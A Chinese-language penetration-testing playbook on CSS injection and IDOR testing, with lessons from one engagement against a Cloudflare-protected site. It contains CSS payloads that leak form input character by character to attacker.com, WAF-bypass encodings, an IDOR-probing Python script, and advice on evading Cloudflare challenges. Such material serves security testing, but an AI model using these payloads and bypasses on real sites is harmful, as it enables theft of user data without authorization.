## CSS 高级攻击向量详细说明

> **适用场景**: 当发现表单注入点或邮件系统时，测试 CSS 注入攻击

### 1. CSS 信息窃取（高危）

**原理**: 利用 CSS 属性选择器 + `background: url()` 窃取用户输入

**测试 Payload**:
```css
/* 基础属性选择器 */
input[name="email"][value*="a"] {
  background: url('https://attacker.com/leak?char=a');
}
input[name="email"][value*="b"] {
  background: url('https://attacker.com/leak?char=b');
}

/* 针对所有 input */
input {
  background: url('https://attacker.com/leak?field=input');
}

/* 内联 style */
<div style="background: url('https://attacker.com/test')"></div>

/* CSS import */
<style>@import url('https://attacker.com/evil.css');</style>
```

**攻击路径**:
```
联系表单提交 → 触发自动回复邮件 → 邮件渲染 CSS → background url() 发送请求 → 窃取数据
```

**测试步骤**:
1. 在表单字段（name/email/comment）中注入 CSS Payload
2. 提交表单，触发系统发送自动回复邮件
3. 检查收到的邮件 HTML 源码是否包含注入的 CSS
4. 检查攻击者服务器日志是否收到 `background: url()` 请求
5. 如果收到请求，说明 CSS 被执行了！

**关键突破点**: **邮件系统**
- 邮件客户端通常不应用 WAF 规则
- HTML 邮件允许 `<style>` 标签
- 绕过 Cloudflare WAF（WAF 只保护 Web 请求）

**绕过策略**:
- HTML 实体编码: `&#x3C;style&#x3E;...&#x3C;/style&#x3E;`
- 大小写变换: `<STYLE>...</STYLE>`
- 内联 style 属性（不通过 `<style>` 标签）
- Unicode 编码

## IDOR 测试详细说明（最新 HackerOne 案例）

> **统计**: IDOR 占最新漏洞披露的 44%，是最常见的漏洞类型

### 1. URL vs Body 参数不匹配 IDOR

**原理**: API 检查 URL 中资源的权限，但操作 Body 中指定的资源

**测试 Payload**:
```http
# 正常请求
POST /api/v1/forms/123/submit HTTP/1.1
{
  "form_id": 123,
  "data": {...}
}

# 恶意请求 - 尝试修改其他表单
POST /api/v1/forms/123/submit HTTP/1.1
{
  "form_id": 456,  // ← 不同的表单 ID
  "data": {...}
}
```

**自动化测试脚本**:
```python
def test_parameter_mismatch_idor(base_url, token, endpoint, resource_a, resource_b):
    """测试参数不匹配 IDOR"""
    headers = {'Authorization': f'Bearer {token}'}
    
    # 发送请求：URL 使用 A，Body 使用 B
    response = requests.post(
        f'{base_url}/api/{endpoint}/{resource_a}',
        json={'id': resource_b, 'action': 'update'},
        headers=headers
    )
    
    if response.status_code == 200:
        # 验证是否真的操作了 B
        verify = requests.get(f'{base_url}/api/{endpoint}/{resource_b}', headers=headers)
        if verify.status_code == 200:
            print(f"[!] 发现 IDOR 漏洞！")
            return True
    
    return False
```

**适用场景**:
- ✅ 批量操作 API
- ✅ 设置更新接口
- ✅ 管理后台功能
- ✅ 任何同时接受 URL 和 Body 参数的 API

## 💡 从本测试中学到的经验

> **重要**: 每次测试后都要总结经验，记录到此处。这些经验会帮助未来的测试。

### 1. 不要盲目猜测端点
- **现象**: 使用 `/api/contact`, `/api/feedback` 等猜测的端点全部返回 404
- **初步判断**: 可能没有这些 API
- **深入验证**: 使用 Katana 爬虫爬取真实端点，发现 `/umbraco/api/contactform/submit`
- **教训**: **必须使用工具发现真实端点**，不要浪费时间猜测

### 2. 区分 WAF 拦截和表单验证
- **发现**: 所有 Payload 返回 400 Bad Request
- **关键**: 正常请求也返回 400，说明是表单字段不匹配，不是 WAF 拦截
- **教训**: 创建调试脚本发送正常请求，对比响应差异

### 3. Cloudflare Challenge 阻挡自动化
- **发现**: 访问页面返回 "Enable JavaScript and cookies to continue"
- **关键**: requests 库无法绕过 JavaScript Challenge
- **教训**: 需要 Selenium/Puppeteer 配置浏览器指纹，或者手动分析

### 4. 邮件系统是 CSS 注入的最佳目标
- **发现**: Web 端有 Cloudflare WAF，但邮件系统可能没有
- **关键**: HTML 邮件通常允许 `<style>` 标签，且不应用 WAF 规则
- **教训**: **优先测试邮件系统**，成功率更高

### 5. SVG feImage 和 SMIL 动画的价值
- **发现**: Nextcloud 漏洞案例中使用了 SVG 过滤器和动画
- **关键**: 可以绕过“阻止远程图片”功能，实现 SSRF 和隐私泄露
- **教训**: 如果目标允许上传 SVG 或渲染 SVG，这些技术非常有用

### 6. 编码绕过的重要性
- **发现**: Cloudflare WAF 过滤常见的 HTML 标签
- **关键**: HTML 实体编码、Unicode 编码可能绕过检测
- **教训**: 准备多种编码方式的 Payload，提高绕过成功率
